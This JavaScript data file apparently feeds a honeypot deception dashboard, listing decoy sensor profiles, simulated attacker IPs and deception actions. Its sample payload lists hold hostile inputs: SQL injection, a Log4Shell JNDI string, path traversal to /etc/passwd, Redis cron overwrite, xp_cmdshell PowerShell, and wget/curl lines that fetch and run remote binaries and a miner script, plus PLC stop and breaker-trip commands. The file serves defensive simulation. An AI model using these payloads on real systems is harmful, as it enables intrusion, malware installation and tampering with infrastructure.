/**
 * VantaHoney Deception Suite - Core Data & Simulation Profiles
 * Decoy configurations, Geo-distributed attacker IP pools, and Threat Payloads
 */

window.VANTA_DATA = {
  // Sensor Hubs (Honeypot Nodes)
  sensors: [
    { id: 'fra', name: 'Frankfurt Central (EU-CENTRAL-1)', code: 'FRA-01', lat: 50.1109, lon: 8.6821, region: 'Europe', status: 'OPTIMAL' },
    { id: 'iad', name: 'Ashburn Vault (US-EAST-1)', code: 'IAD-02', lat: 39.0438, lon: -77.4874, region: 'North America', status: 'OPTIMAL' },
    { id: 'sin', name: 'Singapore Citadel (AP-SOUTHEAST-1)', code: 'SIN-03', lat: 1.3521, lon: 103.8198, region: 'Asia-Pacific', status: 'OPTIMAL' },
    { id: 'tyo', name: 'Tokyo Bastion (AP-NORTHEAST-1)', code: 'TYO-04', lat: 35.6762, lon: 139.6503, region: 'East Asia', status: 'OPTIMAL' },
    { id: 'gru', name: 'São Paulo Enclave (SA-EAST-1)', code: 'GRU-05', lat: -23.5505, lon: -46.6333, region: 'South America', status: 'OPTIMAL' }
  ],

  // Decoy Profiles
  profiles: {
    web: {
      id: 'web',
      name: 'Web Application Cluster',
      tagline: 'Emulating High-Value Nginx / Apache & Microservices API Gateways',
      icon: 'globe',
      emulationEngine: 'Nginx/1.24.0 (Ubuntu) + Node.js v20.11 + PHP-FPM 8.2',
      banner: 'HTTP/1.1 200 OK | Server: nginx/1.24.0 | X-Powered-By: PHP/8.2.14',
      primaryPorts: [80, 443, 8080, 8443, 3000, 9000],
      portNames: {
        80: 'HTTP',
        443: 'HTTPS',
        8080: 'Tomcat/Dev',
        8443: 'Alt-SSL',
        3000: 'GraphQL API',
        9000: 'PHP-FPM/Admin'
      },
      tactics: [
        'Fake SQL Error synthesis with 1.4s deceptive lag',
        'Synthetic /wp-admin & /phpmyadmin honeypot traps',
        'Canary session tokens injected in Set-Cookie headers',
        'Log4Shell JNDI fake callback listener',
        'Spring4Shell RCE payload quarantine box'
      ],
      vectors: ['SQL Injection', 'RCE Exploit', 'Path Traversal', 'Credential Stuffing', 'XSS Probe', 'API Auth Bypass'],
      samplePayloads: [
        "' UNION SELECT null, username, password_hash FROM admin_users--",
        "${jndi:ldap://185.220.101.4:1389/Exploit}",
        "GET /../../../../etc/passwd HTTP/1.1",
        "POST /wp-login.php user=admin&pass=admin123",
        "GET /.env HTTP/1.1",
        "POST /api/v1/graphql query={users{id,email,stripe_key}}",
        "GET /actuator/heapdump HTTP/1.1"
      ]
    },

    db: {
      id: 'db',
      name: 'Enterprise Database Farm',
      tagline: 'Emulating Enterprise Relational, In-Memory & NoSQL Clusters',
      icon: 'database',
      emulationEngine: 'PostgreSQL 16.2 / MySQL 8.0.35 / Redis 7.2.4-CE / MongoDB 7.0',
      banner: '5.7.44-log MySQL Community Server | PostgreSQL 16.2 on x86_64',
      primaryPorts: [3306, 5432, 6379, 27017, 1433, 1521],
      portNames: {
        3306: 'MySQL',
        5432: 'PostgreSQL',
        6379: 'Redis In-Memory',
        27017: 'MongoDB NoSQL',
        1433: 'MS-SQL Server',
        1521: 'Oracle TNS'
      },
      tactics: [
        'Seeded honey-tables with synthetic corporate credit card records',
        'Redis unauthenticated CONFIG SET memory dump entrapment',
        'Fake Postgres COPY TO PROGRAM sandbox diversion',
        'MongoDB arbitrary eval() telemetry logger',
        'Honey-hashes generated with traceable beacon tokens'
      ],
      vectors: ['Auth Dictionary Spray', 'RCE via COPY/xp_cmdshell', 'Memory Dump Exfiltration', 'NoSQL Injection', 'Privilege Escalation'],
      samplePayloads: [
        "CONFIG SET dir /var/spool/cron/crontabs && CONFIG SET dbfilename root",
        "SELECT * FROM pg_catalog.pg_user WHERE usename = 'superuser'",
        "db.customers.find({$where: 'sleep(5000)'})",
        "EXEC master..xp_cmdshell 'powershell.exe -enc SQBFAFgA...'",
        "CONNECT root/password123@ORCL:1521",
        "AUTH default:supersecret2025!"
      ]
    },

    bastion: {
      id: 'bastion',
      name: 'SSH / Bastion Gateway',
      tagline: 'Emulating Perimeter Linux Bastions, Jumpboxes & Telemetry Consoles',
      icon: 'terminal',
      emulationEngine: 'Cowrie Deception Core v2.4 + Synthetic OpenSSH 9.2p1',
      banner: 'SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u2 | Protocol 2.0',
      primaryPorts: [22, 23, 2222, 3389, 21, 8022],
      portNames: {
        22: 'SSH (Bastion)',
        23: 'Telnet (Legacy)',
        2222: 'Docker SSH',
        3389: 'RDP Gateway',
        21: 'FTP (VSFTPD)',
        8022: 'Alt-Terminal'
      },
      tactics: [
        'Full interactive simulated Debian bash shell with honeypot fake FS',
        'Keystroke capture and real-time terminal replay recording',
        'Fake root credential acceptance for behavioral surveillance',
        'Automated malware binary drop interception and SHA-256 hash sandbox',
        'SSH brute-force tarpit with adaptive exponential delay'
      ],
      vectors: ['SSH Key Spraying', 'Mirai Botnet Telnet Probe', 'RDP BlueKeep / CredSSP', 'Anonymous FTP Recon', 'Bash Command Injection'],
      samplePayloads: [
        "ssh root@soc.internal -o 'PreferredAuthentications=password'",
        "USER anonymous | PASS guest@anonymous.org",
        "sh -c 'wget http://45.154.255.8/bins/arm7 -O - | sh'",
        "cat /proc/cpuinfo; lscpu; uname -a",
        "curl -sL http://malicious-drop.ru/xmrig.sh | bash",
        "RDP NTLMv2 Negotiate Hash Exfil"
      ]
    },

    scada: {
      id: 'scada',
      name: 'SCADA / ICS Critical Infrastructure',
      tagline: 'Emulating Siemens S7-1200, Modbus RTU/TCP & DNP3 Power Grid PLCs',
      icon: 'cpu',
      emulationEngine: 'Conpot ICS Industrial Simulation Grid + Virtual Siemens S7 Sim',
      banner: 'Siemens S7-1200 CPU 1214C DC/DC/DC | Firmware V4.5.1',
      primaryPorts: [502, 102, 20000, 47808, 1883, 44818],
      portNames: {
        502: 'Modbus/TCP',
        102: 'Siemens S7comm',
        20000: 'DNP3 Substation',
        47808: 'BACnet Building',
        1883: 'MQTT Industrial',
        44818: 'EtherNet/IP'
      },
      tactics: [
        'Simulated water cooling turbine RPM and temperature metrics generator',
        'Modbus coil register force-override telemetry trap',
        'Virtual S7 Stop CPU command deception feedback',
        'DNP3 unauthorized command injection logging',
        'Fake OT network air-gap bridge honeynet'
      ],
      vectors: ['PLC Logic Manipulation', 'Modbus Coil Force', 'Firmware Flash Tamper', 'Unauthenticated MQTT Dump', 'Air-Gap Bridge Recon'],
      samplePayloads: [
        "MODBUS_FC05: Write Single Coil Addr 0x0010 -> State: ON",
        "S7COMM: Function 0x28 (STOP CPU) Job Packet Injection",
        "DNP3: Direct Operate 0x05 (Trip Substation Breaker 4)",
        "MQTT SUBSCRIBE # (Industrial Sensor Telemetry Stream)",
        "BACnet: ReadPropertyRequest Object: Device 1001",
        "CIP: ForwardOpen Connection to PLC Slot 0"
      ]
    },

    omni: {
      id: 'omni',
      name: 'Omni HoneyNet (All-in-One)',
      tagline: 'Enterprise Multi-Tier Distributed Deception Mesh Across All Vectors',
      icon: 'shield',
      emulationEngine: 'Hybrid Autonomous Deception Mesh v3.4',
      banner: 'Global Deception Sensor Mesh [FRA + IAD + SIN + TYO + GRU]',
      primaryPorts: [22, 80, 443, 3306, 6379, 502],
      portNames: {
        22: 'SSH Bastion',
        80: 'Web HTTP',
        443: 'Web HTTPS',
        3306: 'MySQL Data',
        6379: 'Redis Cache',
        502: 'SCADA Modbus'
      },
      tactics: [
        'Dynamic multi-protocol decoys with cross-sensor correlation',
        'Adaptive adversary profiling with MITRE ATT&CK auto-tagging',
        'Automated honeynet camouflage shift based on threat intensity',
        'Active cyber countermeasure telemetry',
        'Integrated honey-tokens and fake secrets monitoring'
      ],
      vectors: ['Hybrid Reconnaissance', 'Lateral Movement Attempt', 'Zero-Day Weaponization', 'Botnet Orchestration', 'Data Exfiltration Trap'],
      samplePayloads: [
        "Multi-Vector Synchronized Port Scan (SYN Stealth)",
        "Automated Vulnerability Scanner (Nuclei/Nikto fingerprint)",
        "APT29 C2 Cobalt Strike Beacon Attempt",
        "Ransomware Pre-Execution Recon Probe",
        "Zero-Day Memory Corruption PoC Attempt"
      ]
    }
  },

  // Simulated Global Attacker Profiles
  attackers: [
    { ip: '185.220.101.4', country: 'Germany', code: 'DE', city: 'Frankfurt', lat: 50.1109, lon: 8.6821, asn: 'AS208323 (Tor Exit)', actor: 'TOR Exit Node' },
    { ip: '45.154.255.8', country: 'Russia', code: 'RU', city: 'Moscow', lat: 55.7558, lon: 37.6173, asn: 'AS44050 (Bulletproof Hosting)', actor: 'APT-28 Affinity' },
    { ip: '103.203.57.12', country: 'India', code: 'IN', city: 'Mumbai', lat: 19.0760, lon: 72.8777, asn: 'AS55836 (Cloud Telecom)', actor: 'Automated Botnet' },
    { ip: '194.26.29.112', country: 'Netherlands', code: 'NL', city: 'Amsterdam', lat: 52.3676, lon: 4.9041, asn: 'AS49981 (WorldStream)', actor: 'Mass Scanner' },
    { ip: '91.240.118.232', country: 'Ukraine', code: 'UA', city: 'Kyiv', lat: 50.4501, lon: 30.5234, asn: 'AS200000 (DataPark)', actor: 'Cyber Mercenary' },
    { ip: '114.119.130.45', country: 'China', code: 'CN', city: 'Shanghai', lat: 31.2304, lon: 121.4737, asn: 'AS4134 (ChinaNet)', actor: 'State-Sponsored Actor' },
    { ip: '23.129.64.188', country: 'United States', code: 'US', city: 'Seattle', lat: 47.6062, lon: -122.3321, asn: 'AS397213 (Emerald Onion)', actor: 'Tor Relay' },
    { ip: '178.62.204.15', country: 'United Kingdom', code: 'GB', city: 'London', lat: 51.5074, lon: -0.1278, asn: 'AS14061 (DigitalOcean)', actor: 'Cloud Bot Cluster' },
    { ip: '187.189.14.77', country: 'Brazil', code: 'BR', city: 'São Paulo', lat: -23.5505, lon: -46.6333, asn: 'AS28573 (Claro)', actor: 'Banking Trojan Node' },
    { ip: '102.89.33.19', country: 'Nigeria', code: 'NG', city: 'Lagos', lat: 6.5244, lon: 3.3792, asn: 'AS37107 (Cobanet)', actor: 'Phishing Operator' },
    { ip: '14.161.42.88', country: 'Vietnam', code: 'VN', city: 'Ho Chi Minh', lat: 10.8231, lon: 106.6297, asn: 'AS7552 (Viettel)', actor: 'Crypto Miner Bot' },
    { ip: '193.106.191.24', country: 'Romania', code: 'RO', city: 'Bucharest', lat: 44.4268, lon: 26.1025, asn: 'AS48422 (Voxility)', actor: 'DDoS Reflector' },
    { ip: '197.234.219.8', country: 'South Africa', code: 'ZA', city: 'Johannesburg', lat: -26.2041, lon: 28.0473, asn: 'AS37611 (Afrihost)', actor: 'Recon Node' },
    { ip: '121.140.198.54', country: 'South Korea', code: 'KR', city: 'Seoul', lat: 37.5665, lon: 126.9780, asn: 'AS4766 (Korea Telecom)', actor: 'Lazarus Group Sub' },
    { ip: '179.60.147.2', country: 'Argentina', code: 'AR', city: 'Buenos Aires', lat: -34.6037, lon: -58.3816, asn: 'AS27747 (Telefónica)', actor: 'Credential Harvester' },
    { ip: '139.99.144.71', country: 'Australia', code: 'AU', city: 'Sydney', lat: -33.8688, lon: 151.2093, asn: 'AS16276 (OVH AU)', actor: 'Automated Crawler' },
    { ip: '82.102.23.14', country: 'Sweden', code: 'SE', city: 'Stockholm', lat: 59.3293, lon: 18.0686, asn: 'AS39351 (31173 Services)', actor: 'VPN Anonymizer' },
    { ip: '190.2.144.11', country: 'Panama', code: 'PA', city: 'Panama City', lat: 8.9824, lon: -79.5199, asn: 'AS57169 (Nord Security)', actor: 'Offshore Proxy' },
    { ip: '213.109.202.9', country: 'Iran', code: 'IR', city: 'Tehran', lat: 35.6892, lon: 51.3890, asn: 'AS58224 (TIC Iran)', actor: 'MuddyWater Affiliate' },
    { ip: '201.218.232.1', country: 'Colombia', code: 'CO', city: 'Bogotá', lat: 4.7110, lon: -74.0721, asn: 'AS10620 (Telmex)', actor: 'Exploit Scanner' }
  ],

  // Deception Action Responses
  actions: [
    { label: 'DROPPED', class: 'status-dropped', desc: 'Silently discarded at firewall' },
    { label: 'DECEIVED', class: 'status-deceived', desc: 'Synthetic fake payload served' },
    { label: 'TARPIT', class: 'status-tarpit', desc: 'Held in 60s slow TCP window stall' },
    { label: 'QUARANTINED', class: 'status-quarantined', desc: 'Isolated into ephemeral sandbox' },
    { label: '0-DAY TRAPPED', class: 'status-critical', desc: 'High-priority exploit caught & fingerprinted' }
  ]
};
